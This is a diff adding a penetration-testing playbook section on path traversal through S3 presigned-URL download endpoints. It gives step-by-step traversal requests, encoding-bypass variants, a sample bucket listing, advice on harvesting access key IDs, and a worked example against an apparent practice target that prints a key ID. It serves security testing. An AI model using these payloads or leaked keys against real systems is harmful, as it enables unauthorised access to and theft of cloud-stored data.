@@ -114,3 +114,76 @@ permissions enabled, allowing unauthenticated enumeration of all objects.
 - Write: Denied (403)
 - Severity: Low (public ad images, no PII, no write)
 - Both subdomains pointed to the same bucket
+
+---
+
+## Presigned URL Path Traversal (App-Generated Presigned URLs)
+
+### When to Test
+- App has download/file endpoints that redirect (302) to S3 presigned URLs
+- URL pattern: `https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=...&X-Amz-Credential=...`
+- File parameter controls the S3 object key
+
+### Attack Pattern
+
+**Step 1: Identify the key prefix**
+Normal request: `/download?file=report.pdf` → redirects to `bucket.s3.amazonaws.com/upload/report.pdf?...`
+The app prepends `upload/` to your input.
+
+**Step 2: Escape the prefix with ../**
+```
+/download?file=../
+```
+Generates presigned URL for bucket root: `bucket.s3.amazonaws.com/?...`
+If bucket allows ListBucket via presigned GET → full object listing returned.
+
+**Step 3: Download arbitrary objects**
+```
+/download?file=../secret/credentials.json
+/download?file=profile_avatar/secret.txt
+```
+
+### What to Extract from Presigned URLs
+
+```
+X-Amz-Credential=AKIA3PI3WQDUDLEYSVHT/20260614/us-east-1/s3/aws4_request
+              ^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^  ^^^^^^^^^
+              AWS Access Key ID     Date      Region
+```
+
+| Field | Intelligence Value |
+|-------|-------------------|
+| Access Key ID (AKIA...) | Identifies IAM user, can test other AWS services |
+| Region | Narrows target infrastructure location |
+| Bucket name | From URL hostname: `bucket-name.s3.amazonaws.com` |
+| Key prefix | Reveals directory structure |
+
+### ListBucket via Presigned URL
+
+When `?file=../` produces a presigned GET to the bucket root, following the redirect often returns ListBucketResult XML:
+```xml
+<ListBucketResult>
+  <Name>bucket-name</Name>
+  <Contents><Key>upload/file1.pdf</Key><Size>340491</Size></Contents>
+  <Contents><Key>upload/secret.txt</Key><Size>47</Size></Contents>
+</ListBucketResult>
+```
+
+This works because presigned GET on a bucket (no key) = ListObjects if the IAM policy allows `s3:ListBucket`.
+
+### Traversal Variants to Test
+```
+../                  → bucket root listing
+../../               → same (can't escape bucket)
+../%00               → null byte injection
+....//               → double-encoding bypass
+..%2f                → URL-encoded slash
+%2e%2e/              → URL-encoded dots
+```
+
+### Real-World Example: mock.hackme.secops.group (June 2026)
+- Endpoint: `/s3download?image_name=Certifications.pdf`
+- Normal key: `upload/Certifications.pdf`
+- Traversal: `image_name=../` → presigned URL to bucket root → ListBucketResult with 6 objects
+- Sensitive file: `upload/profile_avatar/secret.txt` (47 bytes, contained flag)
+- Access Key leaked: `AKIA3PI3WQDUDLEYSVHT` in every presigned URL
